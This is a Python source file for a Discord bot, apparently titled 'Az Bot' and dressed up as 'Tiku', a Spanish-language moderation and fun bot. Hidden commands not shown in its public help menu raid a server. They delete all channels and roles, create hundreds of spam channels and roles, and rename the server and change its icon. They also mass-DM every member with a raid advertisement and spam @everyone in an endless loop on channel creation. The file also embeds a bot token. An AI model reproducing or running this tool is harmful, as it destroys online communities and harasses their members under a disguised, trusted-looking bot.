import asyncio
import datetime

import colorama
import discord
from colorama import Fore, Style
from discord.ext import commands

bot = commands.Bot(command_prefix='*', intents=discord.Intents.all(), guilds=True, members=True)

client = discord.Client()

@bot.command()
async def ping(ctx):
    await ctx.send("Pong! ")


@bot.command()

async def invite(ctx):
    await ctx.send(' https://discord.com/api/oauth2/authorize?client_id=897219033953353789&permissions=8&scope=bot')

@bot.command()

async def sum(ctx, numOne: int, numTwo: int):
    await ctx.send(numOne + numTwo)

 

@bot.command()
async def infobot(ctx):
    embed = discord.Embed(title=f"Hola a Todos en {ctx.guild.name} !", description="Hola! Soy Tiku, un bot de moderacion y mucha diversion! Para obtener mas informacion pon *ayuda", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
    await ctx.send(embed=embed)

@bot.command()
async def ayuda(ctx):
    embed = discord.Embed(title="Hola!", description=f"""
    MODERACION
    ==========
    *antiinvite = Anti Spam
    *kick = expulsar
    *ban = banear
    
    DIVERSION
    =========
    *nsfw = Desbloquea +18
    *say = Repite lo que dices
    *moneda = Tirar la moneda
    *kill = mata a alguien
    *pegar = le pega a alguien""", color=0xe91e63 , timestamp=datetime.datetime.utcnow()) 
    await ctx.send(embed=embed)


@bot.event
async def on_guild_channel_delete(ctx):  
  
 
    guild = ctx.message.guild
    with open('az.jpeg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='#Az', icon=icon)




@bot.event
async def on_guild_channel_create(channel):
  while True:
    
    await channel.send(""" 
    **Az Is Here, Baby
    
    https://discord.gg/DXpq8S3bTK 
    
    @everyone** """)



@bot.command(pass_context=True)
async def d(ctx):
     await ctx.message.delete()
     for user in ctx.guild.members:
         try:
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
             await user.send("""
            **AZ acaba de raidear uno de tus servidores 
              https://discord.gg/DXpq8S3bTK @everyone**""")
 
             print(f"[+] Mensaje enviado a {user.name} ")
         except:
             print(f"[-] No se pudo enviar mensajes a  {user.name}.")
             

                 
        
@bot.command(pass_context=True)
async def n(ctx):
    await ctx.message.delete()
    print("[+] Borrando Canales")
    for channel in list(ctx.message.guild.channels):





        try:
            await channel.delete()
             
        except:
            continue
    guild = ctx.message.guild
    await guild.create_text_channel("az")
            
    
 
 

@bot.command()
async def rh(ctx):
    await ctx.message.delete()
    await ctx.author.send("""
    
                                COMANDOS RAID   

                       *n | Borra todos los canales, spam, cambia icono y nombre
                       
                       
                       *a | nuke, crea 500 canales, mdall, spam, cambia icono y nombre                       
                       
                       
                       *c | crea 500 canales, spam
                       
                       
                       *s | Spam mensaje pesonalizado
                       
                       
                       *r | Elimina todos los roles y crea 200 roles mas

                       
                       *d | MD a todos los miembros del servidor
                       
                       
                       *i | cambia nombre y foto del servidor
                       
                       
                     *rh  | Manda los comandos de Raid a tu MD
 
    
    
    """)

#canales
@bot.command(pass_context=True)
async def c(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    channel = await guild.create_text_channel("ƑƲƇƘЄƊ ƁƳ ƛȤ")
    for i in range(500):
        await guild.create_text_channel("ƑƲƇƘЄƊ ƁƳ ƛȤ")
        print("[+] Creando Canales....")

 

@bot.command()
async def r(ctx):
    guild = ctx.guild
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
             
            
     
    for i in range(200 - len(guild.roles)):
        try:
            guild = ctx.guild
            await guild.create_role(name="Az Is Here")

        except:
            pass


 
@bot.command()
async def a(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
             
            
     
    for i in range(200 - len(guild.roles)):
        try:
            guild = ctx.guild
            await guild.create_role(name="ƑƲƇƘЄƊ ƁƳ ƛȤ")
        except:
            pass
    guild = ctx.message.guild
    with open('az.jpeg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='#AZ', icon=icon)
    for channel in ctx.guild.channels:
        try:
            await channel.delete()

        except:
            import time
            from time import sleep
            time.sleep(7)
            continue

        import time
        from time import sleep
        time.sleep(7)
    for i in range(200, 0):
        try:
            await ctx.guild.create_text_channel("ƑƲƇƘЄƊ ƁƳ ƛȤ")
        except:
            pass


 
@bot.command()
async def i(ctx):
     
     
    await ctx.message.delete()
    guild = ctx.message.guild
    with open('az.jpeg', 'rb') as f:
        icon = f.read()
    await guild.edit(name='#Az', icon=icon)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="*infobot para informacion :D", url="http://www.twitch.tv/"))
    print(Fore.RED+"""

 ▄▄▄      ▒███████▒
▒████▄    ▒ ▒ ▒ ▄▀░
▒██  ▀█▄  ░ ▒ ▄▀▒░ 
░██▄▄▄▄██   ▄▀▒   ░
 ▓█   ▓██▒▒███████▒
 ▒▒   ▓▒█░░▒▒ ▓░▒░▒
  ▒   ▒▒ ░░░▒ ▒ ░ ▒
  ░   ▒   ░ ░ ░ ░ ░
      ░  ░  ░ ░    
          ░          v11.23                           
""")
    print("""
    
    [*] Az Bot
    
    [*] https://discord.com/api/oauth2/authorize?client_id=912815506128506940&permissions=545394785527&scope=bot    
    [*] Coded by Ranger         
                          Comandos Raid
          ================================================
                       *n | Borra todos los canales, spam, cambia icono y nombre
                       *a | combinacion                       
                       *c | crea 500 canales, spam
                       *d | MD a todos los miembros del servidor
                       *i | cambia nombre y foto del servidor
                       *r | Elimina todos los roles y crea 200 roles mas
                     *rh  | Manda los comandos de raid a tu MD
                      
          ================================================
          
                            Esperando ordenes...            """)

@bot.event
async def on_server_join(server):
    print("Tiku se unio a {0}".format(server.name))
bot.run('OTEyODE1NTA2MTI4NTA2OTQw.YZ1brw.Lt0GlLKVZby-4PV-rGm4AhzOi2#w')
